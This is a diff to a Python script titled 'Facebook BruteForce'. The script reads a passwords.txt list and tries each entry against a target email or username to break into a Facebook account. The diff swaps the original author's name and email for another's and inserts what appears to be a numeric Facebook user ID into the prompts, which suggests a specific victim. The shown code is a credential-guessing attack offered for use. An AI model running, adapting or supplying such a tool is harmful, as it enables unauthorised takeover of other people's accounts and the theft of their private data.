@@ -1,5 +1,5 @@
-# Author-Kingslayer
-# Email-kingslayer8509@gmail.com
+# Author-mohannad.ghost
+# Email-mohannad.ghost@gmail.com
 # you need to create a file password.txt which contains all possible passwords
 import requests
 import threading
@@ -56,9 +56,9 @@ def function(email, passw, i):
 print("\n---------- Welcome To Facebook BruteForce ----------\n")
 file = open("passwords.txt", "r")
 
-email = input("Enter Email/Username : ")
+email = input("Enter Email/Username :100078947114903 ")
 
-print("\nTarget Email ID : ", email)
+print("\nTarget Email ID :100078947114903 ", email)
 print("\nTrying Passwords from list ...")
 
 i = 0
@@ -70,3 +70,4 @@ while file:
     print(str(i) + " : ", passw)
     if function(email, passw, i):
         break
+	
